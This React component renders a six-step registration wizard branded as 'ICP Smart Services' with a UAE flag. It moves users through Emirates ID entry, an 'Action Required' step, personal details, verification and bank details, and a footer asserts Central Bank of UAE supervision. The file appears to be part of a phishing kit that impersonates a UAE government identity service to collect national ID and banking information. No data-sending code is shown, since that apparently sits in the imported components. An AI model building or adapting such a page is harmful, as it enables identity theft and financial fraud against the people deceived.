import React, { useState } from "react";
import "../App.css";

// Registration Steps
import Step1_EmiratesID from "../components/Step1_EmiratesID";
import Step2_PersonalInfoForm from "../components/Step2_PersonalInfoForm";
import Step3_ActionRequired from "../components/Step3_ActionRequired";
import Step4_GetVerified from "../components/Step4_GetVerified";
import Step5_BankDetails from "../components/Step5_BankDetails";
import Step6_ManualVerification from "../components/Step6_ManualVerification";

function Register() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({});
  const [userId, setUserId] = useState(null);

  const nextStep = () => {
    setCurrentStep((prev) => prev + 1);
    window.scrollTo(0, 0);
  };

  const prevStep = () => {
    setCurrentStep((prev) => prev - 1);
    window.scrollTo(0, 0);
  };

  const updateFormData = (data) => {
    setFormData((prev) => ({ ...prev, ...data }));
  };

  const renderStep = () => {
    switch (currentStep) {
      case 1:
        return (
          <Step1_EmiratesID
            nextStep={nextStep}
            updateFormData={updateFormData}
            formData={formData}
            setUserId={setUserId}
          />
        );

      case 2:
        return (
          <Step3_ActionRequired
            nextStep={nextStep}
            prevStep={prevStep}
            updateFormData={updateFormData}
          />
        );

      case 3:
        return (
          <Step2_PersonalInfoForm
            nextStep={nextStep}
            prevStep={prevStep}
            updateFormData={updateFormData}
            formData={formData}
            userId={userId}
          />
        );

      case 4:
        return (
          <Step4_GetVerified
            nextStep={nextStep}
            prevStep={prevStep}
            updateFormData={updateFormData}
          />
        );

      case 5:
        return (
          <Step5_BankDetails
            nextStep={nextStep}
            prevStep={prevStep}
            updateFormData={updateFormData}
            formData={formData}
            userId={userId}
          />
        );

      case 6:
        return (
          <Step6_ManualVerification
            prevStep={prevStep}
            formData={formData}
            userId={userId}
          />
        );

      default:
        return <h2>Step not found</h2>;
    }
  };

  return (
    <div className="app-container">
      {/* Header */}
      <div className="header">
        <div className="header-content">
          <div className="logo-section">
            <img src="/uae-flag.png" alt="UAE" className="uae-flag" />
            <span className="icp-logo">ICP Smart Services</span>
          </div>

          <div className="step-indicator">
            Step {currentStep} of 6
          </div>
        </div>
      </div>

      {/* Progress */}
      <div className="progress-bar-container">
        <div className="progress-steps">
          {[1, 2, 3, 4, 5, 6].map((step) => (
            <div key={step} className="step-dot-wrapper">
              <div
                className={`step-dot ${
                  currentStep >= step ? "active" : ""
                }`}
              >
                {currentStep > step ? "✓" : step}
              </div>

              <div className="step-label">
                {step === 1 && "ID"}
                {step === 2 && "Action"}
                {step === 3 && "Info"}
                {step === 4 && "Verify"}
                {step === 5 && "Bank"}
                {step === 6 && "Finance"}
              </div>
            </div>
          ))}
        </div>

        <div className="progress-line">
          <div
            className="progress-fill"
            style={{
              width: `${((currentStep - 1) / 5) * 100}%`,
            }}
          />
        </div>
      </div>

      {/* Current Step */}
      <div className="form-container">{renderStep()}</div>

      {/* Footer */}
      <div className="footer-note">
        All financial institutions listed here comply with UAE regulations and
        are under the supervision of the Central Bank of UAE.
      </div>
    </div>
  );
}

export default Register;